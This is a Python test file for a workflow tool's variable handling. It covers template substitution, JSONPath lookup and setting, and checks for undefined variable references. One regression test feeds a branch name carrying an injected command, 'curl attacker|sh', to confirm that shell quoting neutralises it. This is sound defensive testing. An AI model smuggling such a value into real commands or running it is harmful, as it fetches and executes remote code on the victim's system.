from fdsx.core.variables import (
    _is_var_satisfied,
    analyze_variable_references,
    resolve_jsonpath,
    resolve_template,
    resolve_template_shell_safe,
    set_jsonpath,
)
from fdsx.models.flow import Flow, TaskState


class TestResolveTemplate:
    def test_simple_variable(self):
        result = resolve_template("Hello {name}", {"name": "World"})
        assert result == "Hello World"

    def test_unknown_pattern_preserved(self):
        result = resolve_template("Hello {unknown}", {"name": "World"})
        assert result == "Hello {unknown}"

    def test_missing_variable_preserved(self):
        result = resolve_template("Hello {name}", {})
        assert result == "Hello {name}"

    def test_dot_access(self):
        data = {"user": {"name": "Alice"}}
        result = resolve_template("Hello {user.name}", data)
        assert result == "Hello Alice"

    def test_index_access(self):
        data = {"items": ["first", "second"]}
        result = resolve_template("Item: {items[0]}", data)
        assert result == "Item: first"

    def test_multiple_variables(self):
        result = resolve_template(
            "{greeting} {name}!", {"greeting": "Hello", "name": "World"}
        )
        assert result == "Hello World!"

    def test_no_variables(self):
        result = resolve_template("Hello World!", {})
        assert result == "Hello World!"


class TestResolveJsonPath:
    def test_simple_field(self):
        data = {"name": "Alice"}
        result = resolve_jsonpath("name", data)
        assert result == "Alice"

    def test_nested_field(self):
        data = {"user": {"name": "Alice"}}
        result = resolve_jsonpath("user.name", data)
        assert result == "Alice"

    def test_array_indexing(self):
        data = {"items": ["first", "second", "third"]}
        result = resolve_jsonpath("items[1]", data)
        assert result == "second"

    def test_dollar_sign_prefix(self):
        data = {"name": "Alice"}
        result = resolve_jsonpath("$.name", data)
        assert result == "Alice"

    def test_invalid_path(self):
        data = {"name": "Alice"}
        result = resolve_jsonpath("nonexistent", data)
        assert result is None

    def test_invalid_array_index(self):
        data = {"items": ["first"]}
        result = resolve_jsonpath("items[5]", data)
        assert result is None


class TestSetJsonPath:
    def test_set_new_field(self):
        data = {}
        result = set_jsonpath("name", data, "Alice")
        assert result == {"name": "Alice"}

    def test_set_nested_field(self):
        data = {}
        result = set_jsonpath("user.name", data, "Alice")
        assert result == {"user": {"name": "Alice"}}

    def test_set_array_element(self):
        data = {"items": [None, None]}
        result = set_jsonpath("items[1]", data, "second")
        assert result == {"items": [None, "second"]}

    def test_update_existing(self):
        data = {"name": "Bob"}
        result = set_jsonpath("name", data, "Alice")
        assert result == {"name": "Alice"}

    def test_dollar_sign_prefix(self):
        data = {}
        result = set_jsonpath("$.name", data, "Alice")
        assert result == {"name": "Alice"}

    def test_list_expansion_intermediate_segment(self):
        """Regression: set_jsonpath must grow lists for intermediate segments
        (e.g. items[2].name against empty list)."""
        data = {"items": []}
        result = set_jsonpath("items[2].name", data, "third")
        assert len(result["items"]) == 3
        assert result["items"][2] == {"name": "third"}

    def test_list_expansion_gap_filled_with_empty_dicts(self):
        """Intermediate slots created by list expansion should be dicts."""
        data = {"items": []}
        result = set_jsonpath("items[1].value", data, "x")
        assert isinstance(result["items"][0], dict)
        assert result["items"][1] == {"value": "x"}


class TestResolveTemplateShellSafe:
    def test_shell_metacharacters_quoted(self):
        """Regression: shell metacharacters in variable values must be quoted."""
        variables = {"branch": "main; curl attacker|sh #"}
        result = resolve_template_shell_safe("git checkout {branch}", variables)
        # The value should be shell-quoted so it cannot inject commands
        assert ";" not in result or result.count("'") >= 2
        # shlex.quote wraps in single quotes
        assert "'main; curl attacker|sh #'" in result

    def test_safe_value_unchanged(self):
        """Values without metacharacters should still work correctly."""
        variables = {"name": "hello"}
        result = resolve_template_shell_safe("echo {name}", variables)
        assert result == "echo hello"

    def test_unknown_pattern_preserved(self):
        """Unknown patterns should be preserved as-is."""
        result = resolve_template_shell_safe("echo {unknown}", {"name": "val"})
        assert result == "echo {unknown}"

    def test_single_quotes_in_value_escaped(self):
        """Single quotes in values should be properly escaped."""
        variables = {"msg": "it's a test"}
        result = resolve_template_shell_safe("echo {msg}", variables)
        # shlex.quote handles single quotes
        assert "it" in result
        assert "test" in result


class TestAnalyzeVariableReferences:
    def test_valid_flow_no_errors(self):
        flow = Flow(
            name="Test Flow",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo test",
                    result_path="$.plan",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command="echo {plan}",
                    result_path="$.result",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0

    def test_unreachable_variable_reference(self):
        flow = Flow(
            name="Test Flow",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo test",
                    result_path="$.result",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command="echo {unused_var}",
                    result_path="$.other",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert isinstance(errors, list)
        assert len(errors) == 1
        assert "unused_var" in errors[0]

    # F2 regression: CLI --input keys should suppress false-positive errors
    def test_input_keys_suppress_false_positive(self):
        """F2: variables provided via --input must not be flagged as undefined."""
        # Without input_keys the start state is excluded from checking (it is start_at),
        # so we need a second state to demonstrate the fix.
        flow2 = Flow(
            name="Test Flow 2",
            start_at="start",
            states={
                "start": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.result",
                    next="middle",
                ),
                "middle": TaskState(
                    type="task",
                    provider="system",
                    command="echo {task}",
                    result_path="$.other",
                    end=True,
                ),
            },
        )
        # Without input_keys: should flag missing 'task'
        errors_without = analyze_variable_references(flow2)
        assert any("task" in e for e in errors_without)
        # With input_keys: should be clean
        errors_with = analyze_variable_references(flow2, input_keys={"task"})
        assert len(errors_with) == 0

    # F3 regression: full-path tracking + prefix matching
    def test_nested_path_false_negative_detected(self):
        """F3: different nested sub-paths on producer vs consumer should be flagged."""
        flow = Flow(
            name="Test Flow",
            start_at="produce",
            states={
                "produce": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.review.summary",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review.decision}",  # different sub-path
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 1
        assert "review.decision" in errors[0]

    def test_ancestor_path_satisfies_descendant_ref(self):
        """F3: producing $.review satisfies reference to {review.decision} (ancestor)."""
        flow = Flow(
            name="Test Flow",
            start_at="produce",
            states={
                "produce": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.review",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review.decision}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0

    def test_descendant_path_satisfies_parent_ref(self):
        """F3: producing $.review.summary satisfies reference to {review} (descendant proves parent exists)."""
        flow = Flow(
            name="Test Flow",
            start_at="produce",
            states={
                "produce": TaskState(
                    type="task",
                    provider="system",
                    command="echo hello",
                    result_path="$.review.summary",
                    next="consume",
                ),
                "consume": TaskState(
                    type="task",
                    provider="system",
                    command="echo {review}",
                    result_path="$.final",
                    end=True,
                ),
            },
        )
        errors = analyze_variable_references(flow)
        assert len(errors) == 0


class TestIsVarSatisfied:
    """Unit tests for the _is_var_satisfied helper."""

    def test_exact_match(self):
        assert _is_var_satisfied("review", {"review"}) is True

    def test_ancestor_satisfies(self):
        # "review" is ancestor of "review.decision"
        assert _is_var_satisfied("review.decision", {"review"}) is True

    def test_descendant_satisfies(self):
        # "review.summary" being present proves "review" exists
        assert _is_var_satisfied("review", {"review.summary"}) is True

    def test_unrelated_path_not_satisfied(self):
        assert _is_var_satisfied("other", {"review"}) is False

    def test_partial_prefix_not_satisfied(self):
        # "reviewer" does not satisfy "review" even though it starts with "review"
        assert _is_var_satisfied("reviewer", {"review"}) is False

    # R2-F3: bracket/indexed path tests
    def test_indexed_descendant_satisfies_parent(self):
        # "reviews[0].summary" being present proves "reviews" (ancestor) exists
        assert _is_var_satisfied("reviews", {"reviews[0].summary"}) is True

    def test_parent_satisfies_indexed_descendant(self):
        # "reviews" (whole collection) satisfies "reviews[0].summary"
        assert _is_var_satisfied("reviews[0].summary", {"reviews"}) is True

    def test_different_indexed_paths_not_satisfied(self):
        # "reviews[0].decision" ≠ "reviews[0].summary" (sibling paths)
        assert _is_var_satisfied("reviews[0].decision", {"reviews[0].summary"}) is False
